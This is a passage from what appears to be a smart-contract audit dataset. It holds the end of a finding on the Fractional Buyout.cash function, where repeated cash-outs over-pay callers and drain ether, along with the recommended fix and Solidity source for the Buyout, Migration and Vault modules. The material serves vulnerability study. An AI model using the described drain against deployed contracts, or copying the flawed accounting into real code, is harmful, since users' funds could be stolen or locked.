ether in total. Making a profit of 12.8 ether.\n\nThis can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the Buyout contract.\n\n",
                "Repair": "\nDecrement ethBalance from buyout info buyoutInfo[_vault].ethBalance -= buyoutShare; in Buyout.cash (see @audit-info annotation):\n\nsolidity\nfunction cash(address _vault, bytes32[] calldata _burnProof) external {\n    // Reverts if address is not a registered vault\n    (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n        _vault\n    );\n    if (id == 0) revert NotVault(_vault);\n    // Reverts if auction state is not successful\n    (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);\n    State required = State.SUCCESS;\n    if (current != required) revert InvalidState(required, current);\n    // Reverts if caller has a balance of zero fractional tokens\n    uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);\n    if (tokenBalance == 0) revert NoFractions();\n\n    // Initializes vault transaction\n    bytes memory data = abi.encodeCall(\n        ISupply.burn,\n        (msg.sender, tokenBalance)\n    );\n    // Executes burn of fractional tokens from caller\n    IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n    // Transfers buyout share amount to caller based on total supply\n    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n    uint256 buyoutShare = (tokenBalance * ethBalance) /\n        (totalSupply + tokenBalance);\n    buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement ethBalance by buyoutShare\n    _sendEthOrWeth(msg.sender, buyoutShare);\n    // Emits event for cashing out of buyout pool\n    emit Cash(_vault, msg.sender, buyoutShare);\n}\n\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/440) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/440#issuecomment-1203320091):\n  When more than 1 user calls Buyout.cash, users will receive more ETH than expected leaving a deficit so that later users are unable to access their funds. Agree this is a High risk issue.\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../interfaces/IFERC1155.sol\";\nimport {IMigration, Proposal} from \"../interfaces/IMigration.sol\";\nimport {IModule} from \"../interfaces/IModule.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {MerkleBase} from \"../utils/MerkleBase.sol\";\nimport {Minter} from \"./Minter.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\n\n/// @title Migration\n/// @author Fractional Art\n/// @notice Module contract for vaults to migrate to a new set of permissions\n/// - A fractional holder creates a proposal with a target price and list of modules\n/// - For 7 days, users can contribute their fractions / ether to signal support\n/// - If the target price is reached then a buyout can be triggered and trading\n///   against the proposed buyout price can take place to resolve the outcome\n/// - If a proposal holds more than 51% of the total supply, the buyout succeeds, a new vault can\n///   be created and the underlying assets (ERC-20, ERC-721 and ERC-1155 tokens) can be migrated\ncontract Migration is\n    IMigration,\n    MerkleBase,\n    Minter,\n    Multicall,\n    NFTReceiver,\n    ReentrancyGuard\n{\n    /// @notice Address of Buyout module contract\n    address payable public buyout;\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Counter used to assign IDs to new proposals\n    uint256 public nextId;\n    /// @notice The length for the migration proposal period\n    uint256 public constant PROPOSAL_PERIOD = 7 days;\n    /// @notice Mapping of a vault to it's proposal migration information\n    mapping(address => mapping(uint256 => Proposal)) public migrationInfo;\n    /// @notice Mapping of a proposal ID to a user's ether contribution\n    mapping(uint256 => mapping(address => uint256)) private userProposalEth;\n    /// @notice Mapping of a proposal ID to a user's fractions contribution\n    mapping(uint256 => mapping(address => uint256))\n        private userProposalFractions;\n\n    /// @notice Initializes buyout, registry, and supply contracts\n    constructor(\n        address _buyout,\n        address _registry,\n        address _supply\n    ) Minter(_supply) {\n        buyout = payable(_buyout);\n        registry = _registry;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Proposes a set of modules and plugins to migrate a vault to\n    /// @param _vault Address of the vault\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    /// @param _newFractionSupply New supply of fractional tokens\n    /// @param _targetPrice Target price of the buyout\n    function propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n    /// @notice Joins a migration proposal by contributing ether and fractional tokens\n    /// @param _vault The address of the vault\n    /// @param _proposalId ID of the proposal being contributed to\n    /// @param _amount Number of fractions being contributed\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable nonReentrant {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates ether balances of the proposal and caller\n        proposal.totalEth += msg.value;\n        userProposalEth[_proposalId][msg.sender] += msg.value;\n        // Deposits fractional tokens into contract\n        IFERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates fraction balances of the proposal and caller\n        proposal.totalFractions += _amount;\n        userProposalFractions[_proposalId][msg.sender] += _amount;\n    }\n\n    /// @notice Leaves a proposed migration with contribution amount\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being left\n    function leave(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates fraction balances of the proposal and caller\n        uint256 amount = userProposalFractions[_proposalId][msg.sender];\n        proposal.totalFractions -= amount;\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Updates ether balances of the proposal and caller\n        uint256 ethAmount = userProposalEth[_proposalId][msg.sender];\n        proposal.totalEth -= ethAmount;\n        userProposalEth[_proposalId][msg.sender] = 0;\n\n        // Withdraws fractions from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            amount,\n            \"\"\n        );\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(ethAmount);\n    }\n\n    /// @notice Kicks off the buyout process for a migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being committed to\n    /// @return started Bool status of starting the buyout process\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started)\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if migration is passed proposal period\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (block.timestamp > proposal.startTime + PROPOSAL_PERIOD)\n            revert ProposalOver();\n\n        // Calculates current price of the proposal based on total supply\n        uint256 currentPrice = _calculateTotal(\n            100,\n            IVaultRegistry(registry).totalSupply(_vault),\n            proposal.totalEth,\n            proposal.totalFractions\n        );\n\n        // Checks if the current price is greater than target price of the proposal\n        if (currentPrice > proposal.targetPrice) {\n            // Sets token approval to the buyout contract\n            IFERC1155(token).setApprovalFor(address(buyout), id, true);\n            // Starts the buyout process\n            IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n            proposal.isCommited = true;\n            started = true;\n        }\n    }\n\n    /// @notice Settles a migration by ending the buyout\n    /// @dev Succeeds if buyout goes through, fails otherwise\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being settled\n    function settleVault(address _vault, uint256 _proposalId) external {\n        // Reverts if the migration was not proposed\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (!(proposal.isCommited)) revert NotProposed();\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if the new vault has already been deployed\n        if (proposal.newVault != address(0))\n            revert NewVaultAlreadyDeployed(proposal.newVault);\n\n        // Gets the merkle root for the vault and given proposal ID\n        bytes32[] memory merkleTree = generateMerkleTree(proposal.modules);\n        bytes32 merkleRoot = getRoot(merkleTree);\n        // Deploys a new vault with set permissions and plugins\n        address newVault = IVaultRegistry(registry).create(\n            merkleRoot,\n            proposal.plugins,\n            proposal.selectors\n        );\n        // Sets address of the newly deployed vault\n        proposal.newVault = newVault;\n        // Emits event for settling the new vault\n        emit VaultMigrated(\n            _vault,\n            newVault,\n            _proposalId,\n            proposal.modules,\n            proposal.plugins,\n            proposal.selectors\n        );\n    }\n\n    /// @notice Mints the fractional tokens for a new vault\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _mintProof Merkle proof for minting fractional tokens\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] calldata _mintProof\n    ) external {\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if there is no new vault to migrate to\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (proposal.newVault == address(0)) revert NoVaultToMigrateTo();\n        // Reverts if fractions of the new vault have already been minted\n        if (proposal.fractionsMigrated) revert NewFractionsAlreadyMinted();\n\n        // Mints initial supply of fractions for the new vault\n        _mintFractions(\n            proposal.newVault,\n            address(this),\n            proposal.newFractionSupply,\n            _mintProof\n        );\n\n        migrationInfo[_vault][_proposalId].fractionsMigrated = true;\n        // Emits event for minting fractional tokens for the new vault\n        emit FractionsMigrated(\n            _vault,\n            proposal.newVault,\n            _proposalId,\n            proposal.newFractionSupply\n        );\n    }\n\n    /// @notice Retrieves ether and fractions deposited from an unsuccessful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the failed proposal\n    function withdrawContribution(address _vault, uint256 _proposalId)\n        external\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if caller has no fractional balance to withdraw\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (\n            current != State.INACTIVE ||\n            migrationInfo[_vault][_proposalId].newVault != address(0)\n        ) revert NoContributionToWithdraw();\n\n        // Temporarily store user's fractions for the transfer\n        uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n        // Updates fractional balance of caller\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Withdraws fractional tokens from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            userFractions,\n            \"\"\n        );\n\n        // Temporarily store user's eth for the transfer\n        uint256 userEth = userProposalEth[_proposalId][msg.sender];\n        // Udpates ether balance of caller\n        userProposalEth[_proposalId][msg.sender] = 0;\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(userEth);\n    }\n\n    /// @notice Migrates an ERC-20 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-20 token\n    /// @param _amount Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-20 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC20(\n            _vault,\n            _token,\n            newVault,\n            _amount,\n            _erc20TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-721 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-721 token\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC721(\n            _vault,\n            _token,\n            newVault,\n            _tokenId,\n            _erc721TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-1155 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _id ID of the token\n    /// @param _amount amount to be transferred\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function migrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _id,\n        uint256 _amount,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-1155 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _id,\n            _amount,\n            _erc1155TransferProof\n        );\n    }\n\n    /// @notice Batch migrates multiple ERC-1155 tokens to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _ids IDs of each token type\n    /// @param _amounts Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for batch transferring multiple ERC-1155 tokens\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256[] calldata _ids,\n        uint256[] calldata _amounts,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Batch withdraws multiple ERC-1155 tokens from the old vault and transfers to the new vault\n        IBuyout(buyout).batchWithdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _ids,\n            _amounts,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Migrates the caller's fractions from an old vault to a new one after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    function migrateFractions(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not successful\n        (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        State required = State.SUCCESS;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if proposer of buyout is not this contract\n        if (proposer != address(this)) revert NotProposalBuyout();\n\n        // Gets the last total supply of fractions for the vault\n        (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        // Calculates the total ether amount of a successful proposal\n        uint256 totalInEth = _calculateTotal(\n            1 ether,\n            lastTotalSupply,\n            migrationInfo[_vault][_proposalId].totalEth,\n            migrationInfo[_vault][_proposalId].totalFractions\n        );\n        // Calculates balance of caller based on ether contribution\n        uint256 balanceContributedInEth = _calculateContribution(\n            totalInEth,\n            lastTotalSupply,\n            userProposalEth[_proposalId][msg.sender],\n            userProposalFractions[_proposalId][msg.sender]\n        );\n\n        // Gets the token and fraction ID of the new vault\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        (address token, uint256 newFractionId) = IVaultRegistry(registry)\n            .vaultToToken(newVault);\n        // Calculates share amount of fractions for the new vault based on the new total supply\n        uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);\n        uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /\n            totalInEth;\n\n        // Transfers fractional tokens to caller based on share amount\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            newFractionId,\n            shareAmount,\n            \"\"\n        );\n    }\n\n    /// @notice Generates the merkle tree of a given proposal\n    /// @param _modules List of module contracts\n    /// @return hashes Combined list of leaf nodes\n    function generateMerkleTree(address[] memory _modules)\n        public\n        view\n        returns (bytes32[] memory hashes)\n    {\n        uint256 treeLength;\n        uint256 modulesLength = _modules.length;\n\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                treeLength += IModule(_modules[i]).getLeafNodes().length;\n            }\n        }\n\n        uint256 counter;\n        hashes = new bytes32[](treeLength);\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();\n                uint256 leavesLength = leaves.length;\n                for (uint256 j; j < leavesLength; ++j) {\n                    hashes[counter++] = leaves[j];\n                }\n            }\n        }\n    }\n\n    /// @notice Calculates the total amount of ether\n    /// @param _scalar Scalar used for multiplication\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _totalEth Total ether balance of the proposal\n    /// @param _totalFractions Total fractional balance of the proposal\n    /// @return Total amount of ether\n    function _calculateTotal(\n        uint256 _scalar,\n        uint256 _lastTotalSupply,\n        uint256 _totalEth,\n        uint256 _totalFractions\n    ) private pure returns (uint256) {\n        return\n            (_totalEth * _scalar) /\n            (_scalar - ((_totalFractions * _scalar) / _lastTotalSupply));\n    }\n\n    /// @notice Calculates the amount of ether contributed by the user\n    /// @param _totalInEth Total amount of ether\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _userProposalEth User balance of ether for the proposal\n    /// @param _userProposalFractions User balance of fractions for the proposal\n    /// @return Total contribution amount\n    function _calculateContribution(\n        uint256 _totalInEth,\n        uint256 _lastTotalSupply,\n        uint256 _userProposalEth,\n        uint256 _userProposalFractions\n    ) private pure returns (uint256) {\n        return\n            _userProposalEth +\n            (_userProposalFractions * _totalInEth) /\n            _lastTotalSupply;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    